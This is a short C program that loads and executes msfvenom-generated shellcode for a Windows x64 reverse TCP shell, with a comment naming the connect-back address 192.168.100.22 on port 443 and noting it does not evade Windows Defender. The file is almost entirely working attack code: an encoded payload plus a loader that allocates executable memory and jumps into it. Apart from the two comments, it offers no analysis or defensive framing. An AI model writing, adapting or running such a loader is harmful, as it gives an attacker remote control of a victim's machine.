 /* Generated using msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.100.22 LPORT=443 -f c -b \x00\x0a\x0d  */
 /* This does not bypass windows 10 defender  */

#include "Windows.h"

int main()
{
  
	unsigned char shellcode[] =
		"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
        "\xff\xff\xff\x48\xbb\x22\x63\x3f\xa7\x8c\xfe\xa8\x92\x48"
        "\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xde\x2b\xbc"
        "\x43\x7c\x16\x68\x92\x22\x63\x7e\xf6\xcd\xae\xfa\xc3\x74"
        "\x2b\x0e\x75\xe9\xb6\x23\xc0\x42\x2b\xb4\xf5\x94\xb6\x23"
        "\xc0\x02\x2b\xb4\xd5\xdc\xb6\xa7\x25\x68\x29\x72\x96\x45"
        "\xb6\x99\x52\x8e\x5f\x5e\xdb\x8e\xd2\x88\xd3\xe3\xaa\x32"
        "\xe6\x8d\x3f\x4a\x7f\x70\x22\x6e\xef\x07\xac\x88\x19\x60"
        "\x5f\x77\xa6\x5c\x75\x28\x1a\x22\x63\x3f\xef\x09\x3e\xdc"
        "\xf5\x6a\x62\xef\xf7\x07\xb6\xb0\xd6\xa9\x23\x1f\xee\x8d"
        "\x2e\x4b\xc4\x6a\x9c\xf6\xe6\x07\xca\x20\xda\x23\xb5\x72"
        "\x96\x45\xb6\x99\x52\x8e\x22\xfe\x6e\x81\xbf\xa9\x53\x1a"
        "\x83\x4a\x56\xc0\xfd\xe4\xb6\x2a\x26\x06\x76\xf9\x26\xf0"
        "\xd6\xa9\x23\x1b\xee\x8d\x2e\xce\xd3\xa9\x6f\x77\xe3\x07"
        "\xbe\xb4\xdb\x23\xb3\x7e\x2c\x88\x76\xe0\x93\xf2\x22\x67"
        "\xe6\xd4\xa0\xf1\xc8\x63\x3b\x7e\xfe\xcd\xa4\xe0\x11\xce"
        "\x43\x7e\xf5\x73\x1e\xf0\xd3\x7b\x39\x77\x2c\x9e\x17\xff"
        "\x6d\xdd\x9c\x62\xee\x32\x89\xdb\xa0\x7d\x50\x0d\xa7\x8c"
        "\xbf\xfe\xdb\xab\x85\x77\x26\x60\x5e\xa9\x92\x22\x2a\xb6"
        "\x42\xc5\x42\xaa\x92\x23\xd8\xff\x0f\xe8\xe8\xe9\xc6\x6b"
        "\xea\xdb\xeb\x05\x0f\xe9\x28\x6e\x14\x19\xa0\x73\x2b\xe4"
        "\x1b\xc8\x0b\x3e\xa6\x8c\xfe\xf1\xd3\x98\x4a\xbf\xcc\x8c"
        "\x01\x7d\xc2\x72\x2e\x0e\x6e\xc1\xcf\x68\xda\xdd\xa3\x77"
        "\x2e\x4e\xb6\x57\x52\x6a\xea\xfe\xe6\x36\x14\xa7\x4d\xc2"
        "\x9c\xea\xef\x05\x39\xc2\x82\x63\x3b\x73\x2e\x6e\xb6\x21"
        "\x6b\x63\xd9\xa6\x02\xf8\x9f\x57\x47\x6a\xe2\xfb\xe7\x8e"
        "\xfe\xa8\xdb\x9a\x00\x52\xc3\x8c\xfe\xa8\x92\x22\x22\x6f"
        "\xe6\xdc\xb6\x21\x70\x75\x34\x68\xea\xbd\x3e\xc2\x9f\x7b"
        "\x22\x6f\x45\x70\x98\x6f\xd6\x06\x37\x3e\xa6\xc4\x73\xec"
        "\xb6\x3a\xa5\x3f\xcf\xc4\x77\x4e\xc4\x72\x22\x6f\xe6\xdc"
        "\xbf\xf8\xdb\xdd\xa3\x7e\xf7\xc5\x01\x60\xdf\xab\xa2\x73"
        "\x2e\x4d\xbf\x12\xeb\xee\x5c\xb9\x58\x59\xb6\x99\x40\x6a"
        "\x9c\xf5\x2c\x82\xbf\x12\x9a\xa5\x7e\x5f\x58\x59\x45\x58"
        "\x27\x80\x35\x7e\x1d\x2a\x6b\x15\x0f\xdd\xb6\x77\x24\x48"
        "\xd6\x94\x94\x5e\x69\xbf\x5c\x6c\x8b\xad\x29\x65\x70\x4d"
        "\xc8\xe6\xfe\xf1\xd3\xab\xb9\xc0\x72\x8c\xfe\xa8\x92";


	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, sizeof shellcode);
	((void(*)())exec)();

    return 0;
}
